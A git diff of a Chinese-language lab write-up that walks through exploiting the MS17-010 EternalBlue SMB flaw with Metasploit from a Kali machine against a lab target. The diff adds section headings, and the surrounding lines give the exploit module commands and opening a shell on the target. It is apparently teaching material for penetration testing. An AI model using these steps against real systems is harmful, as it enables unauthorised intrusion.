@@ -77,6 +77,7 @@
 ![img_7.png](img_7.png)
 
 ## 攻击流程
+### 攻击准备
 在kali攻击机上启动渗透测试框架
 'msfconsole'
 ![img_8.png](img_8.png)
@@ -111,6 +112,7 @@
 > run：执行扫描。启动当前模块，开始对目标进行漏洞验证。
 > 结果显示vulnerable，可以开始下一步攻击
 
+### 发动攻击
 切换到攻击模块，设置靶机IP开始攻击
 'use exploit/windows/smb/ms17_010_eternalblue'
 'set rhosts 192.168.142.133'
@@ -118,6 +120,7 @@
 ![img_11.png](img_11.png)
 win!
 
+### 渗透操作 
 接下来获取靶机cmd
 'shell'
 查看详细网络信息与权限级别，靶机系统信息等
